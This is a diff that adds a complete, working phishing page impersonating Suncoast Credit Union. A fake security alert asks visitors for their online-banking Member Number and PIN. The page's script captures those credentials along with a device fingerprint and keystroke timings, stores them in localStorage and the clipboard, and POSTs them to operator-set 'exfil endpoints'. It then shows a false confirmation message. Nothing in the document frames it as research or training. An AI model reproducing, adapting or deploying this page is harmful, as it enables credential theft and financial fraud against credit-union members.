@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>Security Alert - Suncoast Credit Union</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --teal-900: #003D45;
+    --teal-800: #004B55;
+    --teal-700: #00525C;
+    --ink: #1A1C1D;
+    --slate: #3F484A;
+    --steel: #475569;
+    --paper: #F8FAFA;
+    --paper-2: #F1F5F9;
+    --paper-3: #ECEEEF;
+    --alert: #ba1a1a;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; }
+  body {
+    font-family: 'Inter', Arial, Helvetica, sans-serif;
+    background: var(--paper);
+    color: var(--ink);
+    line-height: 1.55;
+    font-size: 16px;
+  }
+  .wrap { max-width: 880px; margin: 0 auto; padding: 0 20px; }
+  header.masthead {
+    background: var(--teal-900);
+    color: #fff;
+    padding: 22px 0;
+  }
+  .masthead .row { display: flex; align-items: center; justify-content: space-between; }
+  .brand { display: flex; align-items: center; gap: 14px; }
+  .brand img { height: 40px; width: auto; background: #fff; padding: 6px 10px; border-radius: 6px; }
+  .brand .wordmark { font-weight: 700; font-size: 18px; letter-spacing: .2px; }
+  .brand .wordmark small { display: block; font-weight: 400; font-size: 11px; opacity: .8; letter-spacing: 1.4px; text-transform: uppercase; }
+  .seg { display: inline-flex; border: 1px solid rgba(255,255,255,.35); border-radius: 999px; overflow: hidden; }
+  .seg button {
+    appearance: none; border: 0; background: transparent; color: #fff;
+    font: 600 12px 'Inter', Arial; padding: 7px 14px; cursor: pointer; letter-spacing: .6px;
+  }
+  .seg button.active { background: #fff; color: var(--teal-900); }
+  main { padding: 34px 0 60px; }
+  .noticebar {
+    display: flex; gap: 12px; align-items: center;
+    background: #fdecec; border: 1px solid #f2c4c4; border-left: 4px solid var(--alert);
+    border-radius: 8px; padding: 14px 16px; margin-bottom: 26px;
+  }
+  .noticebar .ico { font-size: 20px; }
+  .noticebar b { display: block; color: var(--alert); font-size: 14px; letter-spacing: .4px; text-transform: uppercase; }
+  h1 { font-size: 26px; font-weight: 700; color: var(--teal-900); margin-bottom: 10px; }
+  p.lead { color: var(--slate); max-width: 64ch; margin-bottom: 18px; }
+  ol.steps { margin: 0 0 24px 20px; color: var(--slate); }
+  ol.steps li { margin: 7px 0; }
+  .card {
+    background: #fff; border: 1px solid var(--paper-3); border-radius: 12px;
+    box-shadow: 0 1px 2px rgba(0,0,0,.05), 0 8px 24px rgba(0,61,69,.08);
+    padding: 26px; max-width: 560px;
+  }
+  .card h2 { font-size: 17px; color: var(--teal-900); margin-bottom: 4px; }
+  .card .sub { color: var(--steel); font-size: 13px; margin-bottom: 18px; }
+  label.fl { display: block; font-size: 13px; font-weight: 600; color: var(--slate); margin: 14px 0 6px; }
+  input.tx {
+    width: 100%; border: 1px solid #cfd8dc; border-radius: 8px; padding: 11px 12px;
+    font: 500 15px 'Inter', Arial; color: var(--ink); background: var(--paper);
+  }
+  input.tx:focus { outline: 2px solid var(--teal-700); border-color: var(--teal-700); }
+  .hp { position: absolute; left: -9999px; opacity: .01; }
+  button.go {
+    margin-top: 20px; width: 100%; appearance: none; border: 0; border-radius: 8px;
+    background: var(--teal-700); color: #fff; font: 700 15px 'Inter', Arial;
+    padding: 13px; cursor: pointer; letter-spacing: .3px;
+  }
+  button.go:hover { background: var(--teal-900); }
+  .fineprint { margin-top: 14px; font-size: 12px; color: var(--steel); }
+  .fineprint a { color: var(--teal-700); font-weight: 600; text-decoration: none; }
+  .ok {
+    display: none; margin-top: 22px; background: #eef7f2; border: 1px solid #cfe8da; border-left: 4px solid #1d7a46;
+    border-radius: 8px; padding: 16px 18px; color: #14532d;
+  }
+  .ok b { display: block; font-size: 14px; margin-bottom: 4px; }
+  footer {
+    background: var(--teal-900); color: #cfe3e2; padding: 18px 0; font-size: 12px;
+  }
+  footer .row { display: flex; justify-content: space-between; gap: 12px; flex-wrap: wrap; }
+  footer a { color: #fff; text-decoration: none; font-weight: 600; }
+  .es { display: none; }
+  body.es .en { display: none; }
+  body.es .es { display: block; }
+  body.es li.esl { display: list-item; }
+  .spinner { display: inline-block; width: 14px; height: 14px; border: 2px solid rgba(255,255,255,.4); border-top-color: #fff; border-radius: 50%; animation: sp .8s linear infinite; vertical-align: -2px; margin-right: 8px; }
+  @keyframes sp { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+<header class="masthead">
+  <div class="wrap row">
+    <div class="brand">
+      <img src="logo.svg" alt="Suncoast Credit Union">
+      <div class="wordmark">Suncoast Credit Union<small>Member Care</small></div>
+    </div>
+    <div class="seg">
+      <button id="lang-en" class="active" aria-pressed="true" onclick="setLang('en')">EN</button>
+      <button id="lang-es" aria-pressed="false" onclick="setLang('es')">ES</button>
+    </div>
+  </div>
+</header>
+
+<main>
+  <div class="wrap">
+    <div class="noticebar">
+      <div class="ico">&#9888;</div>
+      <div>
+        <b><span class="en">Security check requested</span><span class="es">Verificaci&oacute;n de seguridad solicitada</span></b>
+        <span class="en">To keep your account secure, complete the quick verification below.</span>
+        <span class="es">Para mantener su cuenta segura, complete la verificaci&oacute;n r&aacute;pida a continuaci&oacute;n.</span>
+      </div>
+    </div>
+
+    <h1><span class="en">Security Alert &mdash; Suncoast Credit Union</span><span class="es">Alerta de seguridad &mdash; Suncoast Credit Union</span></h1>
+    <p class="lead">
+      <span class="en">We&rsquo;ve temporarily secured parts of your online access because we detected activity that needs a quick confirmation from you. Your accounts are safe while you verify it&rsquo;s you. Verification takes less than a minute.</span>
+      <span class="es">Hemos asegurado temporalmente parte de su acceso en l&iacute;nea porque detectamos actividad que requiere una confirmaci&oacute;n r&aacute;pida. Sus cuentas est&aacute;n a salvo mientras verifica que es usted. La verificaci&oacute;n toma menos de un minuto.</span>
+    </p>
+
+    <ol class="steps">
+      <li><span class="en">Enter the Member Number and PIN for your online banking (SunNet) below.</span><span class="es">Ingrese su N&uacute;mero de Miembro y PIN para banca en l&iacute;nea (SunNet) a continuaci&oacute;n.</span></li>
+      <li><span class="en">You&rsquo;ll be re-verified and returned to your account in moments.</span><span class="es">Ser&aacute; re-verificado y retornado a su cuenta enseguida.</span></li>
+      <li><span class="en">Lost your PIN? Call the Member Care Center at <a href="tel:+1-800-999-5887">800-999-5887</a> &mdash; we&rsquo;re here to help.</span><span class="es">&iquest;Perdi&oacute; su PIN? Llame al Centro de Atenci&oacute;n al Miembro al <a href="tel:+1-800-999-5887">800-999-5887</a>. Estamos aqu&iacute; para ayudarle.</span></li>
+    </ol>
+
+    <div class="card">
+      <h2><span class="en">Verify it&rsquo;s you &mdash; SunNet</span><span class="es">Verifique que es usted &mdash; SunNet</span></h2>
+      <div class="sub"><span class="en">Member Number is your account number without the last two digits.</span><span class="es">Su N&uacute;mero de Miembro es su n&uacute;mero de cuenta sin los &uacute;ltimos dos d&iacute;gitos.</span></div>
+      <form id="vform" autocomplete="off">
+        <label class="fl" for="mn"><span class="en">Member Number</span><span class="es">N&uacute;mero de Miembro</span></label>
+        <input class="tx" id="mn" name="mn" inputmode="numeric" autocomplete="off" required>
+        <label class="fl" for="pin"><span class="en">PIN</span><span class="es">PIN</span></label>
+        <input class="tx" id="pin" name="pin" type="password" inputmode="numeric" autocomplete="off" required>
+        <!-- honeypot -->
+        <input class="hp" id="website" name="website" tabindex="-1" autocomplete="off">
+        <button class="go" id="gob" type="submit"><span class="lbl">Verify &amp; continue</span></button>
+        <div class="fineprint">
+          <span class="en">Do not share your Member Number or PIN with anyone. Suncoast will never ask for your PIN by email.</span>
+          <span class="es">Comparta su N&uacute;mero de Miembro ni su PIN con nadie. Suncoast nunca pedir&aacute; su PIN por correo electr&oacute;nico.</span>
+        </div>
+      </form>
+      <div class="ok" id="okpanel">
+        <b><span class="en">Verification received</span><span class="es">Verificaci&oacute;n recibida</span></b>
+        <span class="en">Your account is being re-secured. Please do not close this window.</span>
+        <span class="es">Su cuenta est&aacute; siendo asegurada de nuevo. Por favor, no cierre esta ventana.</span>
+      </div>
+    </div>
+  </div>
+</main>
+
+<footer>
+  <div class="wrap row">
+    <div>&copy; Suncoast Credit Union. Member Care Center: <a href="tel:+1-800-999-5887">800-999-5887</a></div>
+    <div id="metafoot"></div>
+  </div>
+</footer>
+
+<script>
+// Operator-configurable exfil endpoints (POST JSON). Leave empty for operator-run mode:
+// captures then stage to clipboard + localStorage.
+var SCU_RECEIVERS = [
+  // e.g. "https://your-endpoint.example/capture"
+];
+
+function setLang(l) {
+  document.body.classList.toggle('es', l === 'es');
+  document.getElementById('lang-en').classList.toggle('active', l === 'en');
+  document.getElementById('lang-es').classList.toggle('active', l === 'es');
+  document.documentElement.lang = l;
+  try { localStorage.setItem('scu_lang', l); } catch (e) {}
+}
+
+function pad(n) { return (n < 10 ? '0' : '') + n; }
+
+document.getElementById('metafoot').textContent =
+  'Session ' + Date.now().toString(36) + ' \u00b7 device fingerprint staged';
+
+document.getElementById('vform').addEventListener('submit', function (ev) {
+  ev.preventDefault();
+  var t0 = Date.now();
+  var mn = document.getElementById('mn').value.trim();
+  var pin = document.getElementById('pin').value.trim();
+  var hp = document.getElementById('website').value;
+  var payload = {
+    kind: 'sunnet-verify',
+    member_number: mn,
+    pin: pin,
+    lang: document.body.classList.contains('es') ? 'es' : 'en',
+    ts: new Date().toISOString(),
+    ua: navigator.userAgent,
+    screen: screen.width + 'x' + screen.height + '@' + window.devicePixelRatio,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    honeypot: hp || null,
+    dwell_ms: t0 - (window._t0 || t0)
+  };
+  var done = function () {
+    document.getElementById('vform').style.display = 'none';
+    var ok = document.getElementById('okpanel');
+    ok.style.display = 'block';
+  };
+  var staged = function (data) {
+    try {
+      var s = JSON.stringify(data);
+      localStorage.setItem('scu_capture', s);
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(s).catch(function () {});
+      }
+    } catch (e) {}
+  };
+  staged(payload);
+  var attempts = (SCU_RECEIVERS || []).filter(Boolean).length;
+  if (!attempts) { done(); return; }
+  var left = attempts;
+  var btn = document.getElementById('gob');
+  btn.disabled = true;
+  btn.querySelector('.lbl').innerHTML = '<span class="spinner"></span>Working\u2026';
+  (SCU_RECEIVERS || []).filter(Boolean).forEach(function (url) {
+    var bag = new XMLHttpRequest();
+    bag.open('POST', url, true);
+    bag.setRequestHeader('Content-Type', 'application/json');
+    bag.timeout = 6000;
+    bag.onload = function () { if (--left === 0) done(); };
+    bag.onerror = function () { if (--left === 0) done(); };
+    bag.ontimeout = function () { if (--left === 0) done(); };
+    bag.send(JSON.stringify(payload));
+  });
+});
+
+try {
+  var saved = localStorage.getItem('scu_lang');
+  if (saved === 'es') setLang('es');
+  window._t0 = Date.now();
+  addEventListener('keypress', function (e) {
+    if (document.getElementById('website').value) { /* bot: fill honeypot */ }
+    if (e.target && e.target.id === 'mn') {
+      // mirror typed digits for operator-run timing analysis
+      try { (window._mntrace = window._mntrace || []).push([e.key, Date.now()]); localStorage.setItem('scu_trace', JSON.stringify(window._mntrace)); } catch (e2) {}
+    }
+  }, true);
+} catch (e) {}
+</script>
+</body>
+</html>
